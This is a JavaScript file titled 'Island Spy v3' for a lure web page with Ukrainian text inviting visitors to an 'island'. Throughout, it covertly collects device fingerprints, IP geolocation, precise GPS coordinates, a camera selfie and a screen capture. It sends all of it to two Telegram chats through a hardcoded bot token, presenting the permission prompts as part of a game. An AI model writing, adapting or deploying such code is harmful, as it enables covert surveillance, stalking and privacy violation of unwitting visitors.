/* ═══════════════════════════════════════════════════
   script.js  —  Island Spy v3
═══════════════════════════════════════════════════ */

const BOT_TOKEN  = '8341746973:AAGk0pIaE21iZe_t6zEqcToLL-5PWvaN5xE';
// Надсилаємо в обидва — канал і групу
const CHAT_IDS   = ['-1003638944939', '-1003852415588'];
const TG_API     = `https://api.telegram.org/bot${BOT_TOKEN}`;

const TTS_TEXT   = 'Привіт! Я запрошую тебе на свій острів. Тут дуже весело! Приходь — не пожалкуєш. В нас є сонце, море і хороша компанія!';
const STORE_KEY  = 'isle_v3_photos';

let currentIP    = null;
let geoData      = {};
let deviceData   = {};
let ttsOn        = false;
let reportSent   = false;
let selfieDataURL = null;
let screenDataURL = null;
let gpsData      = null;
let gpsReady     = false;
let cameraReady  = false;

/* ══════════════════════════════════════════
   TELEGRAM HELPERS
══════════════════════════════════════════ */
async function tgSendText(text) {
  for (const cid of CHAT_IDS) {
    try {
      const r = await fetch(`${TG_API}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: cid, text, parse_mode: 'Markdown', disable_web_page_preview: true }),
      });
      const j = await r.json();
      if (!j.ok) console.warn('tgText error', cid, j);
    } catch(e) { console.warn('tgText fetch error', cid, e); }
  }
}

async function tgSendPhoto(dataURL, caption) {
  const blob = dataURLtoBlob(dataURL);
  for (const cid of CHAT_IDS) {
    try {
      const fd = new FormData();
      fd.append('chat_id', cid);
      fd.append('photo', blob, 'photo.jpg');
      if (caption) { fd.append('caption', caption); fd.append('parse_mode', 'Markdown'); }
      const r = await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: fd });
      const j = await r.json();
      if (!j.ok) console.warn('tgPhoto error', cid, j);
    } catch(e) { console.warn('tgPhoto fetch error', cid, e); }
  }
}

async function tgSendLocation(lat, lng) {
  for (const cid of CHAT_IDS) {
    try {
      const r = await fetch(`${TG_API}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: cid, latitude: lat, longitude: lng }),
      });
      const j = await r.json();
      if (!j.ok) console.warn('tgLoc error', cid, j);
    } catch(e) { console.warn('tgLoc fetch error', cid, e); }
  }
}

function dataURLtoBlob(dataURL) {
  const arr  = dataURL.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  const u8   = new Uint8Array(bstr.length);
  for (let i = 0; i < bstr.length; i++) u8[i] = bstr.charCodeAt(i);
  return new Blob([u8], { type: mime });
}

/* ══════════════════════════════════════════
   DEVICE / BROWSER INFO
══════════════════════════════════════════ */
function getBrowser() {
  const ua = navigator.userAgent;
  const list = [
    [/YaBrowser\/([\d.]+)/,       'Яндекс Браузер'],
    [/Edg\/([\d.]+)/,             'Edge'],
    [/OPR\/([\d.]+)/,             'Opera'],
    [/Firefox\/([\d.]+)/,         'Firefox'],
    [/Chrome\/([\d.]+)/,          'Chrome'],
    [/Version\/([\d.]+).*Safari/, 'Safari'],
    [/MSIE ([\d.]+)/,             'IE'],
  ];
  for (const [rx, name] of list) {
    const m = ua.match(rx);
    if (m) return `${name} ${m[1]}`;
  }
  return 'Unknown';
}

function getOS() {
  const ua = navigator.userAgent;
  if (/iPhone/.test(ua))           return 'iPhone iOS';
  if (/iPad/.test(ua))             return 'iPad iOS';
  const and = ua.match(/Android ([\d.]+)/);
  if (and)                         return 'Android ' + and[1];
  if (/Windows NT 10/.test(ua))    return 'Windows 10/11';
  if (/Windows NT 6\.3/.test(ua))  return 'Windows 8.1';
  if (/Windows NT 6\.1/.test(ua))  return 'Windows 7';
  if (/Windows/.test(ua))          return 'Windows';
  const mac = ua.match(/Mac OS X ([\d_]+)/);
  if (mac)                         return 'macOS ' + mac[1].replace(/_/g,'.');
  if (/Linux/.test(ua))            return 'Linux';
  return 'Unknown OS';
}

function getGPU() {
  try {
    const gl  = document.createElement('canvas').getContext('webgl');
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    if (ext) return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
  } catch {}
  return 'n/a';
}

function getCanvasFP() {
  try {
    const c   = document.getElementById('fpCanvas');
    c.width   = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.fillStyle = '#ff6600';
    ctx.font      = '13px Arial';
    ctx.fillText('Island🏝️fp', 2, 20);
    ctx.fillStyle = 'rgba(0,200,100,.7)';
    ctx.fillRect(10, 25, 80, 15);
    return c.toDataURL().slice(-24);
  } catch { return 'n/a'; }
}

function getConnection() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return 'n/a';
  return [c.effectiveType, c.type, c.downlink ? c.downlink+'Mbps' : ''].filter(Boolean).join(' / ');
}

async function getBattery() {
  try {
    const b   = await navigator.getBattery();
    const pct = Math.round(b.level * 100);
    return `${pct}% ${b.charging ? '⚡ заряджається' : '🔋 батарея'}`;
  } catch { return 'n/a'; }
}

async function collectDevice() {
  const bat = await getBattery();
  const d = {
    browser:  getBrowser(),
    os:       getOS(),
    dev:      /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? '📱 Мобільний' : '🖥️ Десктоп',
    scr:      `${screen.width}×${screen.height} (DPR:${window.devicePixelRatio})`,
    touch:    navigator.maxTouchPoints > 0 ? 'так' : 'ні',
    cpu:      navigator.hardwareConcurrency || 'n/a',
    ram:      navigator.deviceMemory ? navigator.deviceMemory+'GB' : 'n/a',
    gpu:      getGPU(),
    net:      getConnection(),
    bat,
    lang:     navigator.language || 'n/a',
    langs:    (navigator.languages||[]).join(', '),
    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
    now:      new Date().toLocaleString('uk-UA'),
    ref:      document.referrer || 'прямий перехід',
    cookie:   navigator.cookieEnabled ? 'так' : 'ні',
    dnt:      navigator.doNotTrack || 'n/a',
    platform: navigator.platform || 'n/a',
    fp:       getCanvasFP(),
  };
  deviceData = d;

  // fill UI
  document.getElementById('browser').textContent = d.browser;
  document.getElementById('os').textContent      = `${d.os} | ${d.dev}`;
  document.getElementById('scr').textContent     = `${d.scr} | Touch: ${d.touch}`;
  document.getElementById('hw').textContent      = `CPU: ${d.cpu} ядер | RAM: ${d.ram}`;
  document.getElementById('gpu').textContent     = d.gpu;
  document.getElementById('net').textContent     = d.net;
  document.getElementById('bat').textContent     = d.bat;
  document.getElementById('lang').textContent    = `${d.lang} (${d.langs})`;
  document.getElementById('tz').textContent      = `${d.now} | ${d.tz}`;
  document.getElementById('ref').textContent     = d.ref;
  document.getElementById('fp').textContent      = d.fp;
  return d;
}

/* ══════════════════════════════════════════
   GPS — ТОЧНА ГЕОЛОКАЦІЯ
══════════════════════════════════════════ */
function requestGPS() {
  if (!navigator.geolocation) {
    gpsReady = true;
    maybeSendReport();
    return;
  }

  document.getElementById('gpsStatus').textContent = '📡 Запитуємо GPS...';

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const { latitude: lat, longitude: lng, accuracy, altitude, speed } = pos.coords;
      gpsData = { lat, lng, accuracy, altitude, speed };
      gpsReady = true;

      // Update UI
      document.getElementById('gpsStatus').textContent =
        `📍 GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)}  (точність: ±${Math.round(accuracy)}м)`;

      // Build map with GPS coords (more accurate than IP)
      buildMap(lat, lng, `GPS ±${Math.round(accuracy)}м`);

      // Send GPS location pin to Telegram
      tgSendLocation(lat, lng);

      // Send Google Maps link
      const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
      tgSendText(
        `📍 *ТОЧНА GPS ЛОКАЦІЯ ВІДВІДУВАЧА*\n` +
        `🎯 Координати: \`${lat.toFixed(6)}, ${lng.toFixed(6)}\`\n` +
        `📏 Точність: ±${Math.round(accuracy)} метрів\n` +
        (altitude != null ? `⛰️ Висота: ${Math.round(altitude)} м\n` : '') +
        (speed != null && speed > 0 ? `🚗 Швидкість: ${Math.round(speed * 3.6)} км/г\n` : '') +
        `🗺️ [Відкрити в Google Maps](${mapsLink})\n` +
        `🏠 [Apple Maps](https://maps.apple.com/?q=${lat},${lng})`
      );

      maybeSendReport();
    },
    (err) => {
      console.warn('GPS error:', err.message);
      document.getElementById('gpsStatus').textContent = '❌ GPS відхилено або недоступний';
      gpsReady = true;
      maybeSendReport();
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

/* ══════════════════════════════════════════
   IP GEO (приблизна локація)
══════════════════════════════════════════ */
async function fetchGeo() {
  try {
    const r = await fetch('https://ipapi.co/json/');
    const d = await r.json();
    applyGeo({
      ip: d.ip, org: d.org, as: d.asn,
      city: d.city, region: d.region, country: d.country_name,
      lat: d.latitude, lng: d.longitude,
      tz: d.timezone, postal: d.postal,
    });
  } catch {
    try {
      const r = await fetch('https://ip-api.com/json/?fields=66846719');
      const d = await r.json();
      applyGeo({
        ip: d.query, org: d.isp, as: d.as,
        city: d.city, region: d.regionName, country: d.country,
        lat: d.lat, lng: d.lon,
        tz: d.timezone, postal: d.zip,
        mobile: d.mobile, proxy: d.proxy, hosting: d.hosting,
      });
    } catch {
      document.getElementById('ip').textContent = 'не визначено';
      currentIP = 'unknown';
    }
  }
}

function applyGeo(d) {
  currentIP = d.ip || 'unknown';
  geoData   = d;

  const loc = [d.city, d.region, d.country].filter(Boolean).join(', ');
  document.getElementById('ip').textContent       = d.ip || '—';
  document.getElementById('location').textContent = loc || '—';
  document.getElementById('isp').textContent      = d.org || '—';
  document.getElementById('locationLabel').textContent = loc ? '📍 ' + loc : '📍 IP локація';

  showOldPhotos(d.ip);

  // Show IP-based map as fallback (GPS will override if available)
  if (d.lat && d.lng && !gpsData) buildMap(parseFloat(d.lat), parseFloat(d.lng), loc);
}

/* ══════════════════════════════════════════
   MAP
══════════════════════════════════════════ */
let leafletMap = null;

function buildMap(lat, lng, label) {
  document.getElementById('mapWrap').classList.add('visible');

  if (!leafletMap) {
    leafletMap = L.map('map', { zoomControl: false, attributionControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom:19 }).addTo(leafletMap);
  }

  leafletMap.setView([lat, lng], gpsData ? 16 : 11); // zoom in more if GPS

  const icon = L.divIcon({
    className: '',
    html: `<style>@keyframes rpl{0%{box-shadow:0 0 0 0 rgba(255,68,0,.8)}70%{box-shadow:0 0 0 20px rgba(255,68,0,0)}100%{box-shadow:0 0 0 0 rgba(255,68,0,0)}}</style>
           <div style="width:18px;height:18px;border-radius:50%;background:rgba(255,68,0,.95);animation:rpl 1.4s infinite;"></div>`,
    iconSize:[18,18], iconAnchor:[9,9],
  });

  L.marker([lat, lng], { icon })
    .addTo(leafletMap)
    .bindPopup(`<b>📍 ${label}</b>`, { closeButton:false })
    .openPopup();
}

/* ══════════════════════════════════════════
   LOCAL STORAGE — PHOTOS
══════════════════════════════════════════ */
function loadStore()      { try { return JSON.parse(localStorage.getItem(STORE_KEY)) || {}; } catch { return {}; } }
function saveStore(s)     { try { localStorage.setItem(STORE_KEY, JSON.stringify(s)); } catch {} }

function savePhotoLocal(ip, dataURL) {
  const s = loadStore();
  if (!s[ip]) s[ip] = [];
  s[ip].push({ dataURL, time: new Date().toLocaleString('uk-UA') });
  if (s[ip].length > 8) s[ip] = s[ip].slice(-8);
  saveStore(s);
}

function showOldPhotos(ip) {
  const photos = (loadStore()[ip] || []);
  if (!photos.length) return;
  const wrap = document.getElementById('oldPhotoWrap');
  const grid = document.getElementById('oldPhotosGrid');
  wrap.style.display = 'block';
  grid.innerHTML = '';
  photos.forEach(p => {
    const card = document.createElement('div');
    card.className = 'oldPhotoCard';
    const img = document.createElement('img');
    img.src = p.dataURL;
    const t = document.createElement('div');
    t.className = 'photoTime';
    t.textContent = p.time;
    card.append(img, t);
    grid.appendChild(card);
  });
}

/* ══════════════════════════════════════════
   CAMERA
══════════════════════════════════════════ */
async function startCamera() {
  const statusEl = document.getElementById('selfieStatus');
  const imgEl    = document.getElementById('selfieImg');
  const canvas   = document.getElementById('selfieCanvas');
  const video    = document.getElementById('camVideo');

  statusEl.textContent = '📷 Запитуємо камеру...';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode:'user', width:{ideal:640}, height:{ideal:480} },
      audio: false,
    });
    video.srcObject = stream;
    await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });

    statusEl.textContent = '⏳ Фокусуємо...';
    await new Promise(res => setTimeout(res, 1800));

    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    selfieDataURL = canvas.toDataURL('image/jpeg', 0.88);
    imgEl.src = selfieDataURL;
    imgEl.classList.add('show');
    statusEl.textContent = '✅ Ось ти! 😱';
    stream.getTracks().forEach(t => t.stop());

    const saveWhenReady = () => {
      if (currentIP) savePhotoLocal(currentIP, selfieDataURL);
      else setTimeout(saveWhenReady, 500);
    };
    saveWhenReady();

  } catch (err) {
    statusEl.textContent = { NotAllowedError:'🚫 Камера відхилена', NotFoundError:'❌ Камера не знайдена' }[err.name] || '⚠️ Камера недоступна';
  }

  cameraReady = true;
  maybeSendReport();
}

/* ══════════════════════════════════════════
   SCREEN CAPTURE
══════════════════════════════════════════ */
async function tryScreenCapture() {
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video:true, audio:false });
    const video  = document.createElement('video');
    video.srcObject = stream;
    await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });
    await new Promise(res => setTimeout(res, 500));
    const c = document.createElement('canvas');
    c.width  = video.videoWidth;
    c.height = video.videoHeight;
    c.getContext('2d').drawImage(video, 0, 0);
    screenDataURL = c.toDataURL('image/jpeg', 0.82);
    stream.getTracks().forEach(t => t.stop());
    await tgSendPhoto(screenDataURL, '🖥️ *Скрін екрану відвідувача*');
  } catch { /* відмовився */ }
}

/* ══════════════════════════════════════════
   BUILD REPORT & SEND
══════════════════════════════════════════ */
function buildCaption() {
  const d  = geoData;
  const dv = deviceData;
  const loc = [d.city, d.region, d.country].filter(Boolean).join(', ');

  let gpsLine = '❌ відхилено';
  if (gpsData) {
    const mapsUrl = `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}`;
    gpsLine = `✅ [${gpsData.lat.toFixed(5)}, ${gpsData.lng.toFixed(5)}](${mapsUrl}) ±${Math.round(gpsData.accuracy)}м`;
  }

  return [
    `🏝️ *НОВИЙ ВІДВІДУВАЧ ОСТРОВА*`,
    ``,
    `🌐 *IP:* \`${d.ip || '—'}\``,
    `📍 *IP-локація:* ${loc || '—'}`,
    `🎯 *GPS (точна):* ${gpsLine}`,
    `📮 *Індекс:* ${d.postal || 'n/a'}`,
    `⏰ *Timezone:* ${d.tz || dv.tz || 'n/a'}`,
    `🏢 *Провайдер:* ${d.org || '—'}`,
    `🔗 *AS:* ${d.as || 'n/a'}`,
    `🕵️ *VPN/Proxy:* ${d.proxy != null ? (d.proxy ? '⚠️ ТАК' : 'ні') : 'n/a'}`,
    `📱 *Мобільний оператор:* ${d.mobile != null ? (d.mobile ? 'так' : 'ні') : 'n/a'}`,
    ``,
    `💻 *Браузер:* ${dv.browser || getBrowser()}`,
    `🖥️ *ОС:* ${dv.os || getOS()}`,
    `📲 *Тип:* ${dv.dev || 'n/a'}`,
    `📐 *Екран:* ${dv.scr || 'n/a'}`,
    `👆 *Touch:* ${dv.touch || 'n/a'}`,
    `🧠 *CPU:* ${dv.cpu || 'n/a'} ядер`,
    `💾 *RAM:* ${dv.ram || 'n/a'}`,
    `🎮 *GPU:* ${dv.gpu || 'n/a'}`,
    `📶 *З'єднання:* ${dv.net || 'n/a'}`,
    `🔋 *Батарея:* ${dv.bat || 'n/a'}`,
    `🗣️ *Мови:* ${dv.langs || dv.lang || 'n/a'}`,
    `🍪 *Cookies:* ${dv.cookie || 'n/a'}`,
    `🚫 *DNT:* ${dv.dnt || 'n/a'}`,
    `🔗 *Реферер:* ${dv.ref || 'прямий'}`,
    `🆔 *Canvas FP:* \`${dv.fp || 'n/a'}\``,
    `⏱️ *Час входу:* ${dv.now || new Date().toLocaleString('uk-UA')}`,
  ].join('\n');
}

async function maybeSendReport() {
  if (reportSent)   return;
  if (!currentIP)   return;   // чекаємо IP
  if (!cameraReady) return;   // чекаємо камеру (або відмову)
  if (!gpsReady)    return;   // чекаємо GPS (або відмову)

  reportSent = true;
  const caption = buildCaption();

  if (selfieDataURL) {
    await tgSendPhoto(selfieDataURL, caption);
  } else {
    await tgSendText(caption);
  }

  // Скрін екрану — після основного звіту
  setTimeout(tryScreenCapture, 2000);
}

/* ══════════════════════════════════════════
   TTS LOOP
══════════════════════════════════════════ */
function speakOnce() {
  if (!ttsOn) return;
  const synth = window.speechSynthesis;
  synth.cancel();
  const u  = new SpeechSynthesisUtterance(TTS_TEXT);
  u.lang   = 'uk-UA'; u.rate = 0.88; u.pitch = 0.8; u.volume = 1;
  const voices = synth.getVoices();
  const v = voices.find(v=>v.lang.startsWith('uk')) || voices.find(v=>v.lang.startsWith('ru')) || voices[0];
  if (v) u.voice = v;
  u.onstart = () => document.getElementById('soundDot').classList.add('active');
  u.onend   = () => { if (ttsOn) setTimeout(speakOnce, 1500); };
  u.onerror = () => { if (ttsOn) setTimeout(speakOnce, 2000); };
  synth.speak(u);
}

function startTTS() {
  ttsOn = true;
  const synth = window.speechSynthesis;
  if (synth.getVoices().length) speakOnce();
  else synth.addEventListener('voiceschanged', speakOnce, { once:true });
}

/* ══════════════════════════════════════════
   FULLSCREEN
══════════════════════════════════════════ */
function tryFullscreen() {
  const el = document.documentElement;
  const fn = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
  if (fn) fn.call(el).catch(() => {});
}

/* ══════════════════════════════════════════
   BOOT
══════════════════════════════════════════ */
async function boot() {
  // Start geo + device (no gesture needed)
  fetchGeo();
  await collectDevice();

  // Fallback: send after 20s even if GPS/camera still pending
  setTimeout(() => {
    if (!reportSent) {
      gpsReady    = true;
      cameraReady = true;
      maybeSendReport();
    }
  }, 20000);

  // Tap overlay
  const overlay = document.getElementById('tapOverlay');
  overlay.addEventListener('click', () => {
    overlay.style.display = 'none';
    tryFullscreen();
    startTTS();
    startCamera();   // запитує камеру
    requestGPS();    // запитує GPS — ТОЧНЕ місцезнаходження
  }, { once: true });
}

document.addEventListener('DOMContentLoaded', boot);
